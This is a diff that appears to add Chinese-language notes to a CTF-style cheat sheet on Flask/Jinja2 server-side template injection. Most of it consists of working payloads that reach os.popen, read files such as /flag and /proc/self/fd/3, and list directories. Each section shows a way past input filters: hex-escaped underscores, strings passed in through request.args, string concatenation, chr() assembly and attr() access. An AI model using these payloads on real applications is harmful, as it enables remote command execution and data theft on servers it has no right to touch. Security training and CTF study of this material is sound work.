@@ -28,3 +28,63 @@ request.json		 post传json  (Content-Type: application/json)
 config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
 g                    {{g}}得到<flask.g of 'flask_ssti'>
 ```
+
+^
+## **绕过基础**
+单引号'被过滤可以用双引号"代替；
+
+至于点.和下划线_被过滤可以采用16进制来表示，用的方式选定。知道怎么过滤了那就照着以前payload修改就好了。
+```
+{{config["\x5f\x5fclass\x5f\x5f"]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("whoami")["read"]()}}
+
+利用frozen_importlib_external.FileLoader类
+get_data方法直接读打开过的文件内容
+{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
+```
+
+^
+## **引号绕过**
+传参绕过
+```
+?name={{lipsum.__globals__.os.popen(request.args.ocean).read()}}&ocean =cat /flag
+?name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=cat /flag
+```
+
+下面拿到os后继续传参绕过request.args.a
+
+字符串拼接绕过
+```
+(config.__str__()[2])
+(config.__str__()[42])	
+
+?name={{url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]}}
+等于
+?name={{url_for.__globals__['os']}}
+```
+
+chr拼接绕过
+```
+?name={% set chr=url_for.__globals__.__builtins__.chr %}{% print  url_for.__globals__[chr(111)%2bchr(115)]%}
+```
+
+
+
+^
+## **基础关键词绕过**
+如由于使用\['**globals**']会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式\['**glo'+'bals**']
+
+```
+{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}
+
+
+等效：
+request.__class__
+request["__class__"]
+request["__cla""ss__"]
+request["__cla"+"ss__"]
+request|attr("__class__")
+
+array[0]
+array.pop(0)
+```
+
